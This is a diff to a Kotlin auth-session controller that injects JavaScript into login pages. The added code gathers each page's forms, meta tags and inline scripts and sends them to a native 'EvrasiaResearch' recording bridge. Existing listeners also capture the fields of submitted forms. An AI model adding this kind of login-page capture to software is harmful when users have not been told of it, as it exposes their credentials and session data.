@@ -191,6 +191,25 @@ internal class AuthSessionController(
               window.__WR_AUTH_INSTALLED=true;
               const send=o=>{try{EvrasiaResearch.record(JSON.stringify(o))}catch(e){}};
               const absolute=u=>{try{return new URL(String(u||''),location.href).href}catch(e){return String(u||'')}};
+              const pageSource=()=>{
+                const parts=[];
+                let size=0;
+                const limit=600000;
+                const add=value=>{
+                  try{
+                    value=String(value||'');
+                    if(!value||size>=limit)return;
+                    const left=limit-size;
+                    if(value.length>left)value=value.slice(0,left);
+                    parts.push(value);
+                    size+=value.length;
+                  }catch(e){}
+                };
+                try{for(const node of Array.from(document.querySelectorAll('form'))){add(node.outerHTML)}}catch(e){}
+                try{for(const node of Array.from(document.querySelectorAll('meta'))){add(node.outerHTML)}}catch(e){}
+                try{for(const node of Array.from(document.querySelectorAll('script:not([src])'))){add(node.textContent||'')}}catch(e){}
+                return parts.join('\n');
+              };
               const safeField=e=>{
                 const type=String(e.type||'').toLowerCase();
                 let value='';
@@ -200,6 +219,7 @@ internal class AuthSessionController(
                 else value=String(e.value==null?'':e.value);
                 return {name:String(e.name||''),type:type,value:value};
               };
+              send({source:'auth-page-source',time:Date.now(),url:location.href,method:'GET',content:pageSource()});
               document.addEventListener('submit',function(ev){
                 if(!window.__WR_AUTH_ACTIVE)return;
                 try{
